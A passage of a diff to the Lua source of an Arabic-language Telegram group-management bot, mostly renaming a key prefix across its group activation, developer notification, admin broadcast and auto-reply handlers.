+DevALI:set(JENRAL.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
 if not Sudo(msg) then
 SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
@@ -9284,11 +9272,11 @@ end
 if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
-if not DevALI:sismember(Jenral..'ALI:Groups',msg.chat_id_) then
+if not DevALI:sismember(JENRAL..'ALI:Groups',msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد معطله', 1, 'md')
 else
 ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تعطيل المجموعه "..dp.title_)  
-DevALI:srem(Jenral.."ALI:Groups",msg.chat_id_)
+DevALI:srem(JENRAL.."ALI:Groups",msg.chat_id_)
 local Name1 = result.first_name_
 local Name1 = Name1:gsub('"',"") 
 local Name1 = Name1:gsub("'","") 
@@ -9310,7 +9298,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-DevALI:set(Jenral.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevALI:set(JENRAL.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
 if not Sudo(msg) then
 SendText(DevId,"⌁︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
@@ -9319,7 +9307,7 @@ end,nil)
 end,nil)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^المطور$") then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
@@ -9351,28 +9339,28 @@ end
 end,nil)
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'جلب نسخه السورس' then
 if not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './Jenral.lua', '⌁︙نسخة ملف سورس الجنرال',dl_cb, nil)
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './JENRAL.lua', '⌁︙نسخة ملف سورس جنرال ',dl_cb, nil)
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-local List = DevALI:smembers(Jenral.."ALI:Groups")
+local List = DevALI:smembers(JENRAL.."ALI:Groups")
 if #List == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا توجد مجموعات مفعله', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
-local Text = "⌁︙Source Jenral\n⌁︙File Bot Groups\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
+local Text = "⌁︙Source JENRAL\n⌁︙File Bot Groups\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local GroupsManagers = DevALI:scard(Jenral.."ALI:Managers:"..v) or 0
-local GroupsAdmins = DevALI:scard(Jenral.."ALI:Admins:"..v) or 0
-local Groupslink = DevALI:get(Jenral.."ALI:Groups:Links" ..v)
+local GroupsManagers = DevALI:scard(JENRAL.."ALI:Managers:"..v) or 0
+local GroupsAdmins = DevALI:scard(JENRAL.."ALI:Admins:"..v) or 0
+local Groupslink = DevALI:get(JENRAL.."ALI:Groups:Links" ..v)
 Text = Text..k.." ↬ ⤈ \n⌁︙Group ID ↬ "..v.."\n⌁︙Group Link ↬ "..(Groupslink or "Not Found").."\n⌁︙Group Managers ↬ "..GroupsManagers.."\n⌁︙Group Admins ↬ "..GroupsAdmins.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 end
 local File = io.open('GroupsBot.txt', 'w')
@@ -9383,24 +9371,24 @@ io.popen('rm -rf ./GroupsBot.txt')
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevALI:get(Jenral.."ALI:Send:Bot"..Jenral) and not SecondSudo(msg) then 
+if DevALI:get(JENRAL.."ALI:Send:Bot"..JENRAL) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevALI:setex(Jenral.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:setex(JENRAL.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevALI:get(Jenral.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevALI:get(JENRAL.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end 
-List = DevALI:smembers(Jenral..'ALI:Users') 
+List = DevALI:smembers(JENRAL..'ALI:Users') 
 if msg.content_.text_ then
 for k,v in pairs(List) do 
 ALIText = "الرساله"
@@ -9448,26 +9436,26 @@ sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..ALIText.." بنجاح \n⌁︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevALI:get(Jenral.."ALI:Send:Bot"..Jenral) and not SecondSudo(msg) then 
+if DevALI:get(JENRAL.."ALI:Send:Bot"..JENRAL) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevALI:setex(Jenral.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:setex(JENRAL.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevALI:get(Jenral.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevALI:get(JENRAL.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end 
-List = DevALI:smembers(Jenral..'ALI:Groups') 
+List = DevALI:smembers(JENRAL..'ALI:Groups') 
 if msg.content_.text_ then
 for k,v in pairs(List) do 
 ALIText = "الرساله"
@@ -9515,79 +9503,79 @@ sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..ALIText.." بنجاح \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevALI:get(Jenral.."ALI:Send:Bot"..Jenral) and not SecondSudo(msg) then 
+if DevALI:get(JENRAL.."ALI:Send:Bot"..JENRAL) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevALI:setex(Jenral.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:setex(JENRAL.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevALI:get(Jenral.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevALI:get(JENRAL.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false  
 end 
-local List = DevALI:smembers(Jenral..'ALI:Groups')   
+local List = DevALI:smembers(JENRAL..'ALI:Groups')   
 for k,v in pairs(List) do  
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevALI:get(Jenral.."ALI:Send:Bot"..Jenral) and not SecondSudo(msg) then 
+if DevALI:get(JENRAL.."ALI:Send:Bot"..JENRAL) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevALI:setex(Jenral.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:setex(JENRAL.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevALI:get(Jenral.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevALI:get(JENRAL.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false  
 end 
-local List = DevALI:smembers(Jenral..'ALI:Users')   
+local List = DevALI:smembers(JENRAL..'ALI:Users')   
 for k,v in pairs(List) do  
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه بالتثبيت ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevALI:get(Jenral.."ALI:Send:Bot"..Jenral) and not SecondSudo(msg) then 
+if DevALI:get(JENRAL.."ALI:Send:Bot"..JENRAL) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevALI:setex(Jenral.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:setex(JENRAL.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevALI:get(Jenral.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevALI:get(JENRAL.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == "الغاء" then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end 
-local List = DevALI:smembers(Jenral.."ALI:Groups") 
+local List = DevALI:smembers(JENRAL.."ALI:Groups") 
 if msg.content_.text_ then
 for k,v in pairs(List) do 
 ALIText = "الرساله"
 send(v, 0,"["..msg.content_.text_.."]") 
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.text_) 
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.text_) 
 end
 elseif msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -9598,183 +9586,183 @@ end
 for k,v in pairs(List) do 
 ALIText = "الصوره"
 sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,photo) 
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,photo) 
 end 
 elseif msg.content_.animation_ then
 for k,v in pairs(List) do 
 ALIText = "المتحركه"
 sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
 end 
 elseif msg.content_.video_ then
 for k,v in pairs(List) do 
 ALIText = "الفيديو"
 sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
 end 
 elseif msg.content_.voice_ then
 for k,v in pairs(List) do 
 ALIText = "البصمه"
 sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
 end 
 elseif msg.content_.audio_ then
 for k,v in pairs(List) do 
 ALIText = "الصوت"
 sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
 end 
 elseif msg.content_.document_ then
 for k,v in pairs(List) do 
 ALIText = "الملف"
 sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
 end 
 elseif msg.content_.sticker_ then
 for k,v in pairs(List) do 
 ALIText = "الملصق"
 sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
-DevALI:set(Jenral..'ALI:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
+DevALI:set(JENRAL..'ALI:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
 end 
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..ALIText.." بالتثبيت \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
-DevALI:del(Jenral.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'حذف رد من متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد من متعدد' and Manager(msg) and ChCheck(msg) then
-local List = DevALI:smembers(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_)
 if #List == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
 return false
 end
-DevALI:set(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
+DevALI:set(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local DelGpRedRedod = DevALI:get(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRedRedod = DevALI:get(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRedRedod == 'DelGpRedRedod' then
 if text == "الغاء" then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
-if not DevALI:sismember(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_,text) then
+if not DevALI:sismember(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_,text) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
 return false
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
-DevALI:set(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
-DevALI:set(Jenral..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
+DevALI:set(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
+DevALI:set(JENRAL..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
 return false
 end end
 if text == 'حذف رد متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد متعدد' and Manager(msg) and ChCheck(msg) then
-local List = DevALI:smembers(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_)
 if #List == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
 return false
 end
-DevALI:set(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
+DevALI:set(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
 return false
 end
 if text == 'اضف رد متعدد' and Manager(msg) and ChCheck(msg) then
-DevALI:set(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
+DevALI:set(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان" ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local SetGpRedod = DevALI:get(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local SetGpRedod = DevALI:get(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if SetGpRedod == 'SetGpRedod' then
 if text == "الغاء" then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
-if DevALI:sismember(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_,text) then
+if DevALI:sismember(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_,text) then
 local ALI = "⌁︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
 Msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(ALI).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-DevALI:del(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر ارسل الرد الاول\n⌁︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
-DevALI:set(Jenral..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
-DevALI:set(Jenral..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
-DevALI:sadd(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_,text)
+DevALI:set(JENRAL..'ALI:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
+DevALI:set(JENRAL..'ALI:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
+DevALI:sadd(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_,text)
 return false
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'حذف رد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
-local List = DevALI:smembers(Jenral..'ALI:Manager:GpRed'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_)
 if #List == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 return false
 end
